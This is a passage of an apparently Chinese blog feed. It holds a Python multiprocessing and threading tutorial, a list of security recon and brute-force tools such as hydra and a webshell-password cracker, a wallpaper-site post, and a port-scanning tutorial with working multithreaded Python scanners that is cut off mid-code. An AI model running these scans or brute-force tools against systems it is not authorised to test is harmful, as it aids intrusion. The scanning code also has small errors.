一次执行一个任务，所以要用for循环</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>pool.apply(fn, (i, ))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Mark~ Mark~ Mark~~~~~~~~~~~~~~~~~~~~~~&quot;</span>)<br>pool.close()<br>pool.join()<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">输出结果</span><br><span class="hljs-string">msg: 0</span><br><span class="hljs-string">end</span><br><span class="hljs-string">msg: 1</span><br><span class="hljs-string">end</span><br><span class="hljs-string">Mark~ Mark~ Mark~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># map_async 异步，任务执行时不阻塞(观察mask位置)</span><br>pool.map_async(fn,<span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Mark~ Mark~ Mark~~~~~~~~~~~~~~~~~~~~~~&quot;</span>)<br>pool.close()<br>pool.join()<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">输出结果</span><br><span class="hljs-string">Mark~ Mark~ Mark~~~~~~~~~~~~~~~~~~~~~</span><br><span class="hljs-string">msg: 0</span><br><span class="hljs-string">msg: 1</span><br><span class="hljs-string">end</span><br><span class="hljs-string">end</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># apply_async 单次启动一个任务，但是异步执行</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>pool.apply_async(fn, (i, ))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Mark~ Mark~ Mark~~~~~~~~~~~~~~~~~~~~~~&quot;</span>)<br>pool.close()<br>pool.join()<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">输出结果</span><br><span class="hljs-string">Mark~ Mark~ Mark~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="hljs-string">msg: 0</span><br><span class="hljs-string">msg: 1</span><br><span class="hljs-string">end</span><br><span class="hljs-string">end</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br></code></pre></td></tr></table></figure><p>另外还有4个函数，简要说一下差别，imap、imap_unordered、starmap 和 starmap_async</p><p>map_async生成子进程时使用的是list，而imap和 imap_unordered则是Iterable，map_async效率略高，而imap和 imap_unordered内存消耗显著的小。</p><p>在处理结果上，imap 和 imap_unordered 可以尽快返回一个Iterable的结果，而map_async则需要等待全部Task执行完毕，返回list。</p><p>而imap 和 imap_unordered 的区别是：imap 和 map_async一样，都按顺序等待Task的执行结果，而imap_unordered则不必。 imap_unordered返回的Iterable，会优先迭代到先执行完成的Task。</p><p>starmap 和 starmap_async就是可以传入多个参数的map和map_async，如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params">msg1, msg2</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;msg1:&quot;</span>, msg1, <span class="hljs-string">&quot;msg2:&quot;</span>, msg2)<br>    time.sleep(<span class="hljs-number">2</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;end&quot;</span>)<br>pool.starmap(fn,[(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>),(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Mark~ Mark~ Mark~~~~~~~~~~~~~~~~~~~~~~&quot;</span>)<br>pool.close()<br>pool.join()<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">输出结果</span><br><span class="hljs-string">msg1: 1 msg2: 1</span><br><span class="hljs-string">msg1: 2 msg2: 2</span><br><span class="hljs-string">end</span><br><span class="hljs-string">end</span><br><span class="hljs-string">Mark~ Mark~ Mark~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h3 id="锁机制"><a href="#锁机制" class="headerlink" title="锁机制"></a>锁机制</h3><p>多线程和多进程最大的不同在于，多进程中，同一个变量，各自有一份拷贝存在于每个进程中，互不影响，而多线程中，所有变量都由所有线程共享，所以，任何一个变量都可以被任何一个线程修改，因此，线程之间共享数据最大的危险在于多个线程同时改一个变量，把内容给改乱了。举个例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time, threading<br><br><span class="hljs-comment"># 假定这是你的银行存款:</span><br>balance = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change_it</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-comment"># 先存后取，结果应该为0:</span><br>    <span class="hljs-keyword">global</span> balance<br>    balance = balance + n<br>    balance = balance - n<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_thread</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2000000</span>):<br>        change_it(n)<br><br>t1 = threading.Thread(target=run_thread, args=(<span class="hljs-number">5</span>,))<br>t2 = threading.Thread(target=run_thread, args=(<span class="hljs-number">8</span>,))<br>t1.start()<br>t2.start()<br>t1.join()<br>t2.join()<br><span class="hljs-built_in">print</span>(balance)<br></code></pre></td></tr></table></figure><p>t1和t2这两个线程同时对<code>balance</code>操作，预期结果应该是0，但实际上最终结果却通常不为0</p><p>如果我们要确保<code>balance</code>计算正确，就要给<code>change_it()</code>上一把锁，当某个线程开始执行<code>change_it()</code>时，我们说，该线程因为获得了锁，因此其他线程不能同时执行<code>change_it()</code>，只能等待，直到锁被释放后，获得该锁以后才能改。由于锁只有一个，无论多少线程，同一时刻最多只有一个线程持有该锁，所以，不会造成修改的冲突。创建一个锁就是通过<code>threading.Lock()</code>来实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">balance = <span class="hljs-number">0</span><br>lock = threading.Lock()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_thread</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100000</span>):<br>        <span class="hljs-comment"># 先要获取锁:</span><br>        lock.acquire()<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># 放心地改吧:</span><br>            change_it(n)<br>        <span class="hljs-keyword">finally</span>:<br>            <span class="hljs-comment"># 改完了一定要释放锁:</span><br>            lock.release()<br></code></pre></td></tr></table></figure><p>当多个线程同时执行<code>lock.acquire()</code>时，只有一个线程能成功地获取锁，然后继续执行代码，其他线程就继续等待直到获得锁为止。</p><p>获得锁的线程用完后一定要释放锁，否则那些苦苦等待锁的线程将永远等待下去，成为死线程。所以我们用<code>try...finally</code>来确保锁一定会被释放。</p><p>锁的好处就是确保了某段关键代码只能由一个线程从头到尾完整地执行，坏处当然也很多，首先是阻止了多线程并发执行，包含锁的某段代码实际上只能以单线程模式执行，效率就大大地下降了。其次，由于可以存在多个锁，不同的线程持有不同的锁，并试图获取对方持有的锁时，可能会造成死锁，导致多个线程全部挂起，既不能执行，也无法结束，只能靠操作系统强制终止。</p><p>我们也可以使用<code>with</code>来简化代码，这个模块中所有带有acquire()和release()方法的对象，都可以使用with语句。当进入with语句块时，acquire()方法被自动调用，当离开with语句块时，release()语句块被自动调用。包括Lock、RLock、Condition、Semaphore。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> some_lock:<br>    <span class="hljs-comment"># do something</span><br>    <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>相当于</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">some_lock.acquire()<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-comment"># do something</span><br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">finally</span>:<br>    some_lock.release()<br></code></pre></td></tr></table></figure><h2 id="ThreadLocal"><a href="#ThreadLocal" class="headerlink" title="ThreadLocal"></a>ThreadLocal</h2><p>上面说到，多线程访问同一个共享变量的时候容易出现并发问题，特别是多个线程对一个变量进行写入的时候，为了保证线程安全，一般使用者在访问共享变量的时候需要进行额外的同步措施才能保证线程安全性。加锁就是一个额外的同步措施，ThreadLocal是除了加锁这种同步方式之外的一种保证一种规避多线程访问出现线程不安全的方法，当我们在创建一个变量后，如果每个线程对其进行访问的时候访问的都是线程自己的变量这样就不会存在线程不安全问题。创建一个全局dict，每个线程把自己的name作为key，再存入值，每个线程只对自己的变量进行修改。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<br>    <br><span class="hljs-comment"># 创建全局ThreadLocal对象:</span><br>local_school = threading.local()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_student</span>():<br>    <span class="hljs-comment"># 获取当前线程关联的student:</span><br>    std = local_school.student<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello, %s (in %s)&#x27;</span> % (std, threading.current_thread().name))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_thread</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-comment"># 绑定ThreadLocal的student:</span><br>    local_school.student = name<br>    process_student()<br><br>t1 = threading.Thread(target= process_thread, args=(<span class="hljs-string">&#x27;Alice&#x27;</span>,), name=<span class="hljs-string">&#x27;Thread-A&#x27;</span>)<br>t2 = threading.Thread(target= process_thread, args=(<span class="hljs-string">&#x27;Bob&#x27;</span>,), name=<span class="hljs-string">&#x27;Thread-B&#x27;</span>)<br>t1.start()<br>t2.start()<br>t1.join()<br>t2.join()<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">运行结果</span><br><span class="hljs-string">Hello, Alice (in Thread-A)</span><br><span class="hljs-string">Hello, Bob (in Thread-B)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>全局变量<code>local_school</code>就是一个<code>ThreadLocal</code>对象，每个<code>Thread</code>对它都可以读写<code>student</code>属性，但互不影响。你可以把<code>local_school</code>看成全局变量，但每个属性如<code>local_school.student</code>都是线程的局部变量，可以任意读写而互不干扰，也不用管理锁的问题，<code>ThreadLocal</code>内部会处理。</p><p>可以理解为全局变量<code>local_school</code>是一个<code>dict</code>，不但可以用<code>local_school.student</code>，还可以绑定其他变量，如<code>local_school.teacher</code>等等。</p><p><code>ThreadLocal</code>最常用的地方就是为每个线程绑定一个数据库连接，HTTP请求，用户身份信息等，这样一个线程的所有调用到的处理函数都可以非常方便地访问这些资源。</p><p>一个<code>ThreadLocal</code>变量虽然是全局变量，但每个线程都只能读写自己线程的独立副本，互不干扰。<code>ThreadLocal</code>解决了参数在一个线程中各个函数之间互相传递的问题。</p><h2 id="多进程-vs-多线程"><a href="#多进程-vs-多线程" class="headerlink" title="多进程 vs 多线程"></a>多进程 vs 多线程</h2><p>多进程模式最大的优点就是稳定性高，因为一个子进程崩溃了，不会影响主进程和其他子进程。（当然主进程挂了所有进程就全挂了，但是Master进程只负责分配任务，挂掉的概率低）著名的Apache最早就是采用多进程模式。</p><p>多进程模式的缺点是创建进程的代价大，在Unix&#x2F;Linux系统下，用<code>fork</code>调用还行，在Windows下创建进程开销巨大。另外，操作系统能同时运行的进程数也是有限的，在内存和CPU的限制下，如果有几千个进程同时运行，操作系统连调度都会成问题。</p><p>多线程模式通常比多进程快一点，但是也快不到哪去，而且，多线程模式致命的缺点就是任何一个线程挂掉都可能直接造成整个进程崩溃，因为所有线程共享进程的内存。</p><p>在Windows下，多线程的效率比多进程要高，所以微软的IIS服务器默认采用多线程模式。由于多线程存在稳定性的问题，IIS的稳定性就不如Apache。为了缓解这个问题，IIS和Apache现在又有多进程+多线程的混合模式，真是把问题越搞越复杂。</p><p>无论是多进程还是多线程，数量多肯定执行速度越快，但也不是绝对。当数量达到一定限度时，速度也会衰减。这是因为操作系统忙于切换任务，没有时间去执行任务，平白无故消耗很多系统资源却没有干成事。</p><h3 id="计算密集型与IO密集型"><a href="#计算密集型与IO密集型" class="headerlink" title="计算密集型与IO密集型"></a>计算密集型与IO密集型</h3><p>Python的线程虽然是真正的线程，但解释器执行代码时，有一个GIL锁：Global Interpreter Lock，任何Python线程执行前，必须先获得GIL锁，然后，每执行100条字节码，解释器就自动释放GIL锁，让别的线程有机会执行。这个GIL全局锁实际上把所有线程的执行代码都给上了锁，所以，多线程在Python中只能交替执行，即使100个线程跑在100核CPU上，也只能用到1个核。</p><p>不过，也不用过于担心，Python虽然不能利用多线程实现多核任务，但可以通过多进程实现多核任务。多个Python进程有各自独立的GIL锁，互不影响。</p><p>计算密集型需要大量计算，主要用到CPU，如圆周率计算、高清视频解码。这种应用场景适合多进程。由于python中存在GIL锁，无法发挥出多核优势。对于计算密集型任务，最好采用C语言编写。</p><p>IO密集型需要对存储器进行大量操作，CPU用到得很少，大部分时间都在等待IO操作。涉及到网络、磁盘IO的任务都属于IO密集型，因此这种应用场景适合python的多线程。</p><h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><p>进程：</p><p>​优点：多核CPU中能充分利用多个CPU，速度快、稳定性高</p><p>​缺点：耗费资源</p><p>线程：</p><p>​优点：共享内存，资源占用低，速度快</p><p>​缺点：稳定性差、加锁后性能差且有可能会造成死锁</p><p>计算密集型：CPU资源占用多，多进程，适合C语言</p><p>IO密集型：CPU资源占用少，时间都花在IO等待上，多线程，适合python</p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>武器库整理</title>
    <link href="/2021/02/08/%E6%AD%A6%E5%99%A8%E5%BA%93%E6%95%B4%E7%90%86/"/>
    <url>/2021/02/08/%E6%AD%A6%E5%99%A8%E5%BA%93%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>文件和目录的扫描：<a href="https://github.com/maurosoria/dirsearch">dirsearch</a>、御剑、<a href="https://github.com/OJ/gobuster">gobuster</a></p><p>子域名搜集：<a href="https://github.com/aboul3la/Sublist3r">sublist3r</a>、<a href="https://github.com/lijiejie/subDomainsBrute">subDomainBrute</a>、<a href="https://github.com/Threezh1/JSFinder">JSFinder</a></p><p>whois信息、域名IP相关信息：<a href="http://whois.chinaz.com/">站长之家工具</a>、微步、奇安信威胁情报中心</p><p>端口扫描：<a href="https://github.com/nmap/nmap">nmap</a>、<a href="https://github.com/robertdavidgraham/masscan">masscan</a>、</p><p>cms指纹识别：云悉、wappalyzer、<a href="https://github.com/Dionach/CMSmap">CMSmap</a>、<a href="http://whatweb.bugscaner.com/">在线cms指纹识别</a></p><p>敏感文件利用：<a href="https://github.com/lijiejie/GitHack">GitHack</a>、<a href="https://github.com/lijiejie/ds_store_exp">ds_store_exp</a>、<a href="https://github.com/lijiejie/idea_exploit">idea_exploit</a>、<a href="https://github.com/mazen160/bfac">bfac</a></p><p>邮箱收集：<a href="https://github.com/laramies/theHarvester">theHarvester</a></p><p>其他搜索引擎：<a href="https://www.tianyancha.com/">天眼查</a>、<a href="https://www.shodan.io/">shodan</a>、<a href="https://fofa.so/">fofa</a>、<a href="https://www.zoomeye.org/">zoomeye</a></p><p>爬虫：<a href="https://github.com/jaeles-project/gospider">gospider</a>、<a href="https://github.com/GerbenJavado/LinkFinder">LinkFinder</a>、<a href="https://github.com/lc/gau">gau</a>、<a href="https://github.com/tomnomnom/waybackurls">waybackurls</a></p><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>ssh、mssql、mysql、FTP等：<a href="https://github.com/vanhauser-thc/thc-hydra">hydra</a></p><p>邮箱服务器破解：MailCracker</p><p>wordpress：<a href="https://github.com/Dionach/CMSmap">CMSmap</a></p><p>一句话木马破解：<a href="https://github.com/shmilylty/cheetah">cheetah</a></p><p>模糊测试：<a href="https://github.com/xmendez/wfuzz">wfuzz</a>、<a href="">fuff</a></p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>分享几个博客配图的网站</title>
    <link href="/2021/02/06/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E5%8D%9A%E5%AE%A2%E9%85%8D%E5%9B%BE%E7%9A%84%E7%BD%91%E7%AB%99/"/>
    <url>/2021/02/06/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E5%8D%9A%E5%AE%A2%E9%85%8D%E5%9B%BE%E7%9A%84%E7%BD%91%E7%AB%99/</url>
    
    <content type="html"><![CDATA[<h2 id="配图"><a href="#配图" class="headerlink" title="配图"></a>配图</h2><p>博客好不好看，配图占一半。在这里分享几个博客配图的网站，如果有推荐的网站，欢迎留言告知哦~</p><h3 id="Wallhaven-推荐指数⭐⭐⭐"><a href="#Wallhaven-推荐指数⭐⭐⭐" class="headerlink" title="Wallhaven 推荐指数⭐⭐⭐"></a>Wallhaven 推荐指数⭐⭐⭐</h3><p>网站首页略微丑了些，但只要一搜索图片，就会对这个网站爱不释手。搜索的图片很丰富，最重要的一点是图片与搜索的关键词匹配度很高，用来找文章封面的配图非常方便</p><p><img src="/image-20210206223927093.png" alt="Wallhaven"></p><p><a href="https://wallhaven.cc/">点击跳转到Wallhaven</a></p><h3 id="Wallpaper-Hub-推荐指数⭐⭐⭐"><a href="#Wallpaper-Hub-推荐指数⭐⭐⭐" class="headerlink" title="Wallpaper Hub 推荐指数⭐⭐⭐"></a>Wallpaper Hub 推荐指数⭐⭐⭐</h3><p>图片大多为风景照和壁纸图，用来做文章背景图很不错，也可以自己下载下来做壁纸。图片质量很高很漂亮，看网站首页就可见一斑！</p><p><img src="/image-20210206223842710.png" alt="Wallpaper Hub"></p><p><a href="https://wallpaperhub.app/">点击跳转到Wallpaper Hub</a></p><h3 id="Unsplash-推荐指数⭐⭐"><a href="#Unsplash-推荐指数⭐⭐" class="headerlink" title="Unsplash 推荐指数⭐⭐"></a>Unsplash 推荐指数⭐⭐</h3><p>图片数量比Wallhaven丰富一丢丢，但与关键词的匹配度不及Wallhaven</p><p><img src="/image-20210206224103881.png" alt="Unsplash"></p><p><a href="https://unsplash.com/">点击跳转到Unsplash</a></p>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>端口扫描原理及实现简易端口扫描脚本</title>
    <link href="/2021/02/04/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0%E7%AE%80%E6%98%93%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E8%84%9A%E6%9C%AC/"/>
    <url>/2021/02/04/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0%E7%AE%80%E6%98%93%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E8%84%9A%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<h2 id="本文目的"><a href="#本文目的" class="headerlink" title="本文目的"></a>本文目的</h2><p>通过本文，你将学习到端口扫描的原理，TCP全连接扫描(Connect)、半连接扫描(SYN)的代码实现</p><h2 id="简易全连接扫描"><a href="#简易全连接扫描" class="headerlink" title="简易全连接扫描"></a>简易全连接扫描</h2><p>通过轮询每个端口，发送TCP请求，如果能建立三次握手，那就说明端口是打开的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><br>remote_server_ip = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;输入要扫描的IP：&#x27;</span>)<br><br>socket.setdefaulttimeout(<span class="hljs-number">0.5</span>) <span class="hljs-comment">#设置超时为0.5秒</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_port</span>(<span class="hljs-params">port</span>):<br>    <span class="hljs-keyword">try</span>:<br>        s = socket.socket(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>) <span class="hljs-comment">#2:socket.AF_INET 1:socket.SOCK_STREAM</span><br>        <span class="hljs-comment">#AF_INET代表ipv4，SOCK_STREAM代表流式socket，对于发送的是TCP请求</span><br>        <span class="hljs-comment">#其实这两个参数不写也没事，因为默认的就是AF_INET和SOCK_STREAM</span><br>        res = s.connect_ex((remote_server_ip,port))<span class="hljs-comment">#连接到address处的套接字，参数为元组格式。有返回值，连接成功时返回0，出错时返回错误编码</span><br><br>        <span class="hljs-keyword">if</span> res == <span class="hljs-number">0</span>: <span class="hljs-comment"># 如果端口开启</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Port %s: OPEN&#x27;</span> % port)<br>        s.close()<span class="hljs-comment">#关闭套接字</span><br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(e.message))<br>        <br><span class="hljs-comment"># Check what time the scan started</span><br>t1 = datetime.now()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">65536</span>): <span class="hljs-comment">#全端口扫描</span><br>    scan_port(i)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Singleprocess Scanning Completed in  %s&#x27;</span> % (datetime.now() - t1))<br></code></pre></td></tr></table></figure><p>等了很久都没出扫描结果，按照半秒一个端口，6万多个端口要扫8个多小时。。这扫描速度也太慢了。我们要想个办法加快扫描速度，于是给代码加上多线程</p><h2 id="多线程全连接扫描"><a href="#多线程全连接扫描" class="headerlink" title="多线程全连接扫描"></a>多线程全连接扫描</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">from</span> multiprocessing.dummy <span class="hljs-keyword">import</span> Pool <span class="hljs-keyword">as</span> ThreadPool<br><br>remote_server_ip = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;输入要扫描的IP：&#x27;</span>)<br>ports = []<br><br>socket.setdefaulttimeout(<span class="hljs-number">0.5</span>) <span class="hljs-comment">#设置超时为0.5秒</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_port</span>(<span class="hljs-params">port</span>):<br>    <span class="hljs-keyword">try</span>:<br>        s = socket.socket(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>) <span class="hljs-comment">#2:socket.AF_INET 1:socket.SOCK_STREAM</span><br>        <span class="hljs-comment">#AF_INET代表ipv4，SOCK_STREAM代表流式socket，对于发送的是TCP请求</span><br>        <span class="hljs-comment">#其实这两个参数不写也没事，因为默认的就是AF_INET和SOCK_STREAM</span><br>        res = s.connect_ex((remote_server_ip,port))<span class="hljs-comment">#连接到address处的套接字，参数为元组格式。有返回值，连接成功时返回0，出错时返回错误编码</span><br><br>        <span class="hljs-keyword">if</span> res == <span class="hljs-number">0</span>: <span class="hljs-comment"># 如果端口开启</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Port %s: OPEN&#x27;</span> % port)<br>        s.close()<span class="hljs-comment">#关闭套接字</span><br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(e.message))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">65536</span>): <span class="hljs-comment">#全端口扫描</span><br>    ports.append(i)<br><br><span class="hljs-comment"># Check what time the scan started</span><br>t1 = datetime.now()<br>pool = ThreadPool(processes = <span class="hljs-number">1000</span>) <span class="hljs-comment">#设置线程池为1000</span><br>results = pool.<span class="hljs-built_in">map</span>(scan_port,ports)<br>pool.close()<br>pool.join()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Multiprocess Scanning Completed in  %s&#x27;</span> % (datetime.now() - t1))<br></code></pre></td></tr></table></figure><p>最终结果：扫描全端口也就34秒，因为是在本地，如果在外网可能还会慢些</p><p>扫描出的结果来看，10808、10809是v2ray的端口，33060是mysql8的端口，其他的端口用<code>netstat -ano</code>查了一下进程号，8680是微信的端口，50309是TIM的端口，7680是个系统程序svchost.exe用的端口，看不出是什么程序</p><p><img src="/image-20210205163415410.png" alt="全连接扫描"></p><p>那么除了提高线程数量，我们还有没有办法再加快端口扫描的速度，答案是有的。</p><h2 id="半连接扫描"><a href="#半连接扫描" class="headerlink" title="半连接扫描"></a>半连接扫描</h2><p>上面的端口扫描是等到TCP完全建立连接后才确认端口是开启状态，也就是走完了整个三次握手的流程，也称全连接扫描。全连接扫描的优点是准确度比较高，缺点也比较明显，速度较慢，并且由于完整地建立了TCP，这个连接过程会被目标主机记录下来。</p><p>下面介绍一种半连接方式，也称TCP SYN扫描。当端口开启时，向端口发送TCP SYN请求，服务器会返回一个ACK响应；当端口关闭时，服务器会返回RST响应。这边我们使用Scapy来实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 